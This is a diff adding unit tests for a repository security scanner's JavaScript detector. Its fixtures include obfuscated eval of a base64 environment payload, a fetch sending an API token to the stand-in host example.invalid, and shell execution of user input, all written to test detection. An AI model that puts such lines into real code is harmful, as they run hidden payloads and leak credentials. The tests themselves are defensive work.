@@ -410,11 +410,47 @@ class OneHealthScannerTests(unittest.TestCase):
         report = scan_repository(self.root)
         self.assertTrue(any(f["rule_id"] == "mutable-git-dependency-ref" for f in report["findings"]))
 
+    def test_javascript_security_detects_obfuscated_execution_and_sensitive_egress(self):
+        code = (
+            "eval(Buffer.from(process.env.PAYLOAD, 'base64').toString());\n"
+            "fetch('https://example.invalid/collect', {method: 'POST', "
+            "body: JSON.stringify({token: process.env.API_TOKEN})});\n"
+        )
+        self.write("scripts/bootstrap.ts", code)
+        report = scan_repository(self.root)
+        findings = [f for f in report["findings"] if f["detector_id"] == "security-javascript"]
+        rules = {f["rule_id"] for f in findings}
+        self.assertIn("node-obfuscated-execution", rules)
+        self.assertIn("node-downloaded-code-execution", rules)
+        self.assertIn("node-sensitive-data-egress", rules)
+        for finding in findings:
+            self.assertNotIn("API_TOKEN", json.dumps(finding))
+            self.assertNotIn("example.invalid/collect", json.dumps(finding))
+        self.assertEqual("ran", report["detector_coverage"]["status_by_detector"]["security-javascript"])
+
+    def test_javascript_security_flags_child_process_shell_execution(self):
+        self.write("scripts/tool.js",
+                   "const { exec } = require('node:child_process');\nexec(userInput);\n")
+        report = scan_repository(self.root)
+        self.assertTrue(any(
+            f["detector_id"] == "security-javascript"
+            and f["rule_id"] == "node-child-process-shell-execution"
+            for f in report["findings"]
+        ))
+
+    def test_javascript_security_has_negative_fixture_for_benign_fetch(self):
+        self.write("src/client.js",
+                   "const message = 'hello';\nfetch('/api/status').then((response) => response.json());\n")
+        report = scan_repository(self.root)
+        self.assertFalse(any(f["detector_id"] == "security-javascript" for f in report["findings"]))
+        self.assertEqual("ran", report["detector_coverage"]["status_by_detector"]["security-javascript"])
+
     def test_security_detectors_are_declared_in_coverage(self):
         self.write("sample.py", "value = 1\n")
         report = scan_repository(self.root)
         self.assertIn("security-secrets", report["detectors_run"])
         self.assertIn("security-code", report["detectors_run"])
+        self.assertIn("security-javascript", report["detectors_run"])
 
     def test_json_report_schema_and_counts_are_present(self):
         self.write("README.md", "Healthy.\n")
